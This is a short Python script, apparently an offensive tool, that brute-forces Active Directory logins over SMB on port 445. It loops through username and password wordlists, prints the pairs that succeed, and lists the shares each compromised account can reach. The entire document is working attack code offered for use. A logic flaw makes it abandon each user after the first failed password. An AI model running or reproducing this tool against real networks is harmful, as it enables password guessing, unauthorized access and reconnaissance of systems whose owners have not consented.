#!/usr/bin/env python3
# Coded by Luigi Vezzoso (xabaras)

import sys

from smb.SMBConnection import SMBConnection




class ADSmbEnum(object):
    def banner(self):
        print("    _   ___    ___       _      ___          _           ")
        print("   /_\ |   \  / __|_ __ | |__  | _ )_ _ _  _| |_ ___ _ _ ")
        print("  / _ \| |) | \__ \ '  \| '_ \ | _ \ '_| || |  _/ -_) '_|")
        print(" /_/ \_\___/  |___/_|_|_|_.__/ |___/_|  \_,_|\__\___|_| ")
        print("                                                        ")
        print("    Luigi Vezzoso (xabaras)\n")



    def readfile(self,path):
        return [l.strip() for l in open(path,'rb')]

    def usage(self):
        self.banner()
        print("Usage: ADSmbEnum.py IP UsernameWordlist PasswordWordlist Domain\n")
        exit(0)



    def main(self):
        self.banner()




        if len(sys.argv) < 5:
            self.usage()


        host=sys.argv[1]

        uwordlist=self.readfile(sys.argv[2])
        pwordlist=self.readfile(sys.argv[3])
        domain=sys.argv[4]

        userTotal = len(uwordlist)
        passTotal = len(pwordlist)
        usercount=0
        passcount=0
        print("Bruteforcing.......")
        for user in uwordlist:
            usercount=usercount+1
            for passwd in pwordlist:
                passcount=passcount+1



                try:
                    smb = SMBConnection(username = user.decode('utf-8'),password=passwd.decode('utf-8'),my_name='',remote_name=domain,domain='',use_ntlm_v2=True,is_direct_tcp=True)

                    smb.connect(host,445)


                    shares = smb.listShares()

                except Exception as e:

                         break
                print('\n[+] Username: ' + user.decode('utf-8') + ' Password: '+ passwd.decode('utf-8') + "\t", end = '')
                print('\x1b[6;30;42m' + 'Founded!' + '\x1b[0m')


                for share in shares:
                    print('\t\t' + share.name)



                smb.close()



        exit(0)







if __name__ == "__main__":
    try:
        ADSmbEnum().main()
    except KeyboardInterrupt as e:
        print('[!] Keyboard Interrupt by User!!')
        exit(0)

